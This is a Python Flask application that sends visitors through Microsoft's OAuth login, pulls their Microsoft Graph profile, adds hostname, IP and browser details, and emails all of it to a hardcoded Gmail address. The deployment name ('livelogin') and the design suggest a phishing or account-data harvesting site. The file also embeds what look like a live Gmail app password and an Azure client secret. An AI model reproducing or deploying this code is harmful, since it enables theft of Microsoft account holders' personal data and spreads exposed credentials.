from flask import Flask, request, redirect, session
import os
import requests
from flask_mail import Mail, Message
import msal
import socket
import httpagentparser

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)
mail = Mail()
mail.init_app(app)

app.config["DEBUG"] = True
app.config['SECRET_KEY'] = 'YOUR_SECRET_KEY'  # Replace with your Flask secret key
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 465
app.config['MAIL_USERNAME'] = 'olamicreas@gmail.com'
app.config['MAIL_PASSWORD'] = 'svyp opql amtv gsva'
app.config['MAIL_USE_TLS'] = False
app.config['MAIL_USE_SSL'] = True
app.config['MAIL_DEFAULT_SENDER'] = 'olamicreas@gmail.com'

mail = Mail(app)

def browserr():
    agent = request.environ.get('HTTP_USER_AGENT')
    browser = httpagentparser.detect(agent)
    if not browser:
        browser = agent.split('/')[0]
    else:
        browser = browser['browser']['name']
    return browser

@app.route('/')
def index():
    client_id = '16675c4e-cbcf-4c5d-8b2b-d02484f3aa81'
    authority = 'https://login.microsoftonline.com/common'
    scope = ['User.Read']

    msal_app = msal.ConfidentialClientApplication(
        client_id,
        client_credential='k_C8Q~c_Aid9eoKS0xHNZ-EgMOtpHFPNFKufFb6h',
        authority=authority,
    )

    auth_url = msal_app.get_authorization_request_url(
        scopes=scope,
        redirect_uri='https://livelogin-1q94.onrender.com/redirect'
    )
    return redirect(auth_url)

@app.route('/redirect')
def handle_redirect():
    client_id = '16675c4e-cbcf-4c5d-8b2b-d02484f3aa81'
    authority = 'https://login.microsoftonline.com/common'
    scope = ['User.Read']

    msal_app = msal.ConfidentialClientApplication(
        client_id,
        client_credential='k_C8Q~c_Aid9eoKS0xHNZ-EgMOtpHFPNFKufFb6h',
        authority=authority,
    )

    if 'code' in request.args:
        code = request.args.get('code')
        result = msal_app.acquire_token_by_authorization_code(
            code,
            scopes=scope,
            redirect_uri='https://livelogin-1q94.onrender.com/redirect'
        )

        if 'access_token' in result:
            access_token = result['access_token']
            response = requests.get(
                'https://graph.microsoft.com/v1.0/me',
                headers={'Authorization': f'Bearer {access_token}'}
            )

            device = socket.gethostname()
            ipAddr = socket.gethostbyname(device)
            browser_name = browserr()

            user_info = response.json()
            body = f"Device: {device}\nIP Address: {ipAddr}\nBrowser: {browser_name}\nUser Info: {user_info}"
            print(body)  # Print the body for debugging purposes

            try:
                with app.app_context():
                    msg = Message(
                        subject='M info',
                        recipients=['olamicreas@gmail.com'],
                        body=body
                    )
                    mail.send(msg)
                return "Email sent successfully!"
            except Exception as e:
                print(f"Failed to send email: {str(e)}")  # Print the error for debugging purposes
                return f"Failed to send email: {str(e)}"
        else:
            error = result.get('error')
            error_description = result.get('error_description')
            print(f"Error: {error}, Description: {error_description}")  # Print the error for debugging purposes
            return f"Error: {error}, Description: {error_description}"
    else:
        return "Authorization code not found in request."

if __name__ == '__main__':
    app.run(debug=True)
